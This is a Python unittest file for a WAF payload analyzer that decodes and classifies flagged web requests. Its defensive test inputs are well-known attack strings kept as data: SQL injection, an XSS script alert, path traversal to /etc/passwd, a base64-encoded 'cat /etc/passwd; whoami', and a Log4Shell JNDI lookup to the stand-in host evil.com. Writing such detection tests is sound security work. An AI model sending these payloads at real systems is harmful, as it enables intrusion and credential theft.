"""Tests for core.waf_payload_analyzer — Milestone A4.

Per ``docs/waf_payload_analyzer.md``, this milestone ships Layer 1 only. The
tests therefore assert two things in equal measure: that decoding works, and
that the module is **honest about what it has not done**. A result that leaves
``crs_matches`` empty without saying CRS never ran would be read as a clean bill
of health, which is the failure mode the whole plan is written against.
"""
from __future__ import annotations

import base64
import unittest

from core import waf_payload_analyzer as wpa
from core.cmdline_analyzer import _row as cmdline_row
from core.waf_payload_parser import parse_waf_line


def _analyze(line: str) -> wpa.WafPayloadAnalysisResult:
    """Parse and analyse one line, failing loudly if it is not a payload."""
    data = parse_waf_line(line)
    assert data is not None, f"not detected as a WAF payload: {line!r}"
    return wpa.analyze_waf_payload(data)


class TestDecoding(unittest.TestCase):
    def test_single_encoded_quote_decodes(self) -> None:
        # The case the whole shared-decoder split exists for: one encoded
        # character, which the command-line profile deliberately ignores.
        result = _analyze("/login | id=1%27 OR 1=1")
        self.assertTrue(result.was_encoded)
        self.assertIn("1' OR 1=1", result.decoded_payload)
        self.assertEqual(result.decode_chain, ["percent-encoding"])

    def test_layered_encoding_resolves(self) -> None:
        result = _analyze("/search | %26%2340%3B%26%2341%3B")
        self.assertTrue(result.was_encoded)
        self.assertEqual(result.decoded_payload, "()")
        self.assertIn("percent-encoding", result.decode_chain)
        self.assertIn("HTML numeric entities", result.decode_chain)

    def test_base64_in_a_query_parameter_decodes(self) -> None:
        blob = base64.b64encode(b"cat /etc/passwd; whoami").decode()
        result = _analyze(f"/api | cmd={blob}&x=1'")
        self.assertTrue(result.was_encoded)
        self.assertIn("cat /etc/passwd", result.decoded_payload)

    def test_plain_payload_is_left_alone(self) -> None:
        result = _analyze("/login | ' OR '1'='1")
        self.assertFalse(result.was_encoded)
        self.assertEqual(result.decoded_payload, "' OR '1'='1")
        self.assertEqual(result.decode_chain, [])

    def test_decoded_payload_is_always_populated(self) -> None:
        # Even when nothing fired, so a consumer never has to fall back to
        # raw_payload and never renders an empty box.
        for line in ("/a | ' OR 1=1", "/b | %27 OR 1=1"):
            with self.subTest(line=line):
                self.assertTrue(_analyze(line).decoded_payload)

    def test_raw_payload_is_preserved(self) -> None:
        result = _analyze("/login | id=1%27")
        self.assertEqual(result.raw_payload, "id=1%27")
        self.assertNotEqual(result.decoded_payload, result.raw_payload)

    def test_path_and_markers_survive_into_the_result(self) -> None:
        result = _analyze("/api/data | ${jndi:ldap://evil.com/a}")
        self.assertEqual(result.path, "/api/data")
        self.assertIn("expression-injection", result.markers)

    def test_decode_failure_is_reported_not_swallowed(self) -> None:
        self.assertEqual(wpa.decode_payload(""), ("", [], True))


class TestHonestyAboutUnrunChecks(unittest.TestCase):
    """The distinction between "found nothing" and "did not look"."""

    def test_a_clean_result_claims_nothing_it_did_not_check(self) -> None:
        result = _analyze("/p | O'Brien")
        self.assertEqual(result.crs_match_count, 0)
        self.assertIsNone(result.cve_fingerprint_match)
        self.assertEqual(result.checks_skipped, [])

    def test_a_truncated_scan_says_so(self) -> None:
        from core.crs_matcher import MAX_SCAN_LEN

        result = _analyze("/x | '" + "a" * (MAX_SCAN_LEN + 50))
        self.assertTrue(
            any("only the first" in note for note in result.checks_skipped),
            "a partial scan presented itself as a complete one",
        )


class TestVerdict(unittest.TestCase):
    def test_cve_fingerprint_reaches_malicious_on_its_own(self) -> None:
        # The module's only single-source Malicious (D10).
        result = _analyze("/api/data | ${jndi:ldap://evil.com/a}")
        self.assertEqual(result.aggregated_verdict, "Malicious")
        self.assertIsNotNone(result.cve_fingerprint_match)
        self.assertEqual(result.cve_fingerprint_match["cve"], "CVE-2021-44228")

    def test_attack_payloads_are_at_least_suspicious(self) -> None:
        for line in (
            "/login | ' OR '1'='1",
            "/search | %3Cscript%3Ealert(1)%3C/script%3E",
            "/dl | ../../../../etc/passwd",
        ):
            with self.subTest(line=line):
                verdict = _analyze(line).aggregated_verdict
                self.assertIn(verdict, ("Suspicious", "Malicious"))

    def test_benign_is_never_returned(self) -> None:
        # Plan D9. These lines reach the tool because a WAF already flagged
        # them; "our rules did not match" is not a clean bill of health.
        result = _analyze("/login | ' OR '1'='1")
        self.assertNotEqual(result.aggregated_verdict, "Benign")

    def test_empty_payload_sets_parse_ok_false(self) -> None:
        result = _analyze("/login?user= |")
        self.assertFalse(result.parse_ok)
        self.assertEqual(result.aggregated_verdict, "Unknown")
        self.assertEqual(result.flags, [])

    def test_parse_ok_distinguishes_empty_from_unmatched(self) -> None:
        # Both are Unknown; only parse_ok tells them apart.
        empty = _analyze("/login?user= |")
        matched_nothing = _analyze("/p | O'Brien")
        self.assertEqual(empty.aggregated_verdict, "Unknown")
        self.assertEqual(matched_nothing.aggregated_verdict, "Unknown")
        self.assertFalse(empty.parse_ok)
        self.assertTrue(matched_nothing.parse_ok)


class TestFlags(unittest.TestCase):
    def test_encoded_payload_raises_an_info_flag(self) -> None:
        result = _analyze("/x | %41%42%43")
        ids = [f["id"] for f in result.flags]
        self.assertIn(wpa.WAF_ENCODED_PAYLOAD, ids)
        flag = next(f for f in result.flags if f["id"] == wpa.WAF_ENCODED_PAYLOAD)
        self.assertEqual(flag["severity"], "INFO")
        self.assertEqual(flag["source"], wpa.FLAG_SOURCE)

    def test_clean_payload_raises_no_flag(self) -> None:
        self.assertEqual(_analyze("/p | O'Brien").flags, [])

    def test_category_flags_follow_the_matched_categories(self) -> None:
        result = _analyze("/search | <script>alert(1)</script>")
        self.assertIn("WAF_XSS_MATCH", {f["id"] for f in result.flags})

    def test_cve_flag_keeps_the_id_out_of_the_flag_id(self) -> None:
        # A per-CVE flag id could not live in the frozenset evidence map and
        # would defeat deduplication (D8). The id goes in the detail.
        result = _analyze("/api | ${jndi:ldap://evil.com/a}")
        flag = next(f for f in result.flags if f["id"] == wpa.WAF_CVE_FINGERPRINT)
        self.assertEqual(flag["severity"], "CRITICAL")
        self.assertIn("CVE-2021-44228", flag["detail"])
        self.assertIn("CVE-2021-44228", flag["source_url"])

    def test_flag_detail_carries_the_decode_chain(self) -> None:
        result = _analyze("/x | %41%42%43")
        flag = next(f for f in result.flags if f["id"] == wpa.WAF_ENCODED_PAYLOAD)
        self.assertIn("percent-encoding", flag["detail"])

    def test_encoding_alone_claims_no_evidence(self) -> None:
        # Encoding is an evasion signal, not proof of an attack (plan D8).
        from ioc.flags import flags_summary_for_evidence

        result = _analyze("/x | %41%42%43")
        self.assertEqual([f["id"] for f in result.flags], [wpa.WAF_ENCODED_PAYLOAD])
        summary = flags_summary_for_evidence(result.flags)
        self.assertFalse(
            any(summary["evidence"].values()),
            f"WAF_ENCODED_PAYLOAD claimed evidence: {summary['evidence']}",
        )

    def test_every_category_flag_claims_exploit_attempt(self) -> None:
        # The asymmetry D8 exists to prevent: substring matching would have
        # given SQLi an evidence key and XSS none.
        from ioc.flags import flags_summary_for_evidence

        for line, flag_id in (
            ("/login | ' OR '1'='1", "WAF_SQLI_MATCH"),
            ("/search | <script>alert(1)</script>", "WAF_XSS_MATCH"),
            ("/dl | ../../../../etc/passwd", "WAF_LFI_MATCH"),
        ):
            with self.subTest(flag_id=flag_id):
                result = _analyze(line)
                self.assertIn(flag_id, {f["id"] for f in result.flags})
                summary = flags_summary_for_evidence(result.flags)
                self.assertTrue(summary["evidence"]["exploit_attempt"])

    def test_flag_carries_a_mitre_link(self) -> None:
        flag = next(
            f for f in _analyze("/x | %41%42%43").flags
            if f["id"] == wpa.WAF_ENCODED_PAYLOAD
        )
        self.assertIn("T1027", flag["mitre"])
        self.assertTrue(flag["source_url"].startswith("https://attack.mitre.org/"))


class TestRows(unittest.TestCase):
    def test_row_schema_matches_the_sibling_modules_exactly(self) -> None:
        # The renderer concatenates rows from three modules into one DataFrame.
        # A missing key produces a ragged column pyarrow cannot convert, which
        # breaks the Table render for the entire run — not just this row.
        rows = to_rows_of("/login | ' OR '1'='1")
        reference = cmdline_row("x", "command_line", "Unknown", "Low", "e", "s")
        self.assertEqual(set(rows[0].keys()), set(reference.keys()))

    def test_confidence_score_is_none_not_empty_string(self) -> None:
        self.assertIsNone(to_rows_of("/login | ' OR 1=1")[0]["ConfidenceScore"])

    def test_one_row_per_line(self) -> None:
        self.assertEqual(len(to_rows_of("/login | ' OR 1=1")), 1)

    def test_row_reports_the_decode_chain_when_nothing_matched(self) -> None:
        row = to_rows_of("/x | %41%42%43")[0]
        self.assertIn("percent-encoding", row["Primary Evidence"])

    def test_row_leads_with_the_score_not_a_single_rule_id(self) -> None:
        # Naming one rule invites reading it as decisive, which is the alert
        # fatigue the module is written against. The weighted total leads.
        row = to_rows_of("/login | ' OR '1'='1")[0]
        self.assertIn("anomaly score", row["Primary Evidence"])

    def test_row_names_the_cve_when_one_matched(self) -> None:
        row = to_rows_of("/api | ${jndi:ldap://evil.com/a}")[0]
        self.assertIn("CVE-2021-44228", row["Primary Evidence"])
        self.assertEqual(row["Confidence"], "High")

    def test_row_evidence_reports_a_clean_scan_plainly(self) -> None:
        row = to_rows_of("/p | O'Brien")[0]
        self.assertIn("No CRS rule", row["Primary Evidence"])

    def test_confidence_tracks_agreement_not_loudness(self) -> None:
        self.assertEqual(to_rows_of("/p | O'Brien")[0]["Confidence"], "Low")
        self.assertEqual(
            to_rows_of("/api | ${jndi:ldap://evil.com/a}")[0]["Confidence"], "High",
        )

    def test_empty_payload_row_explains_itself(self) -> None:
        row = to_rows_of("/login?user= |")[0]
        self.assertIn("No payload", row["Primary Evidence"])

    def test_long_payload_is_truncated(self) -> None:
        row = to_rows_of("/a | " + "'" + "A" * 400)[0]
        self.assertLessEqual(len(row["Artifact"]), 120)

    def test_sources_marks_the_finding_as_local(self) -> None:
        # Plan D7 — local matchers are labelled here rather than added to the
        # provider list, which is wired to network dispatch and timing.
        self.assertIn("Local", to_rows_of("/login | ' OR 1=1")[0]["Sources"])

    def test_no_rows_without_a_line(self) -> None:
        self.assertEqual(wpa.to_rows(wpa.WafPayloadAnalysisResult()), [])


def to_rows_of(line: str) -> list[dict]:
    """Analyse a line and render its rows."""
    return wpa.to_rows(_analyze(line))


if __name__ == "__main__":
    unittest.main()
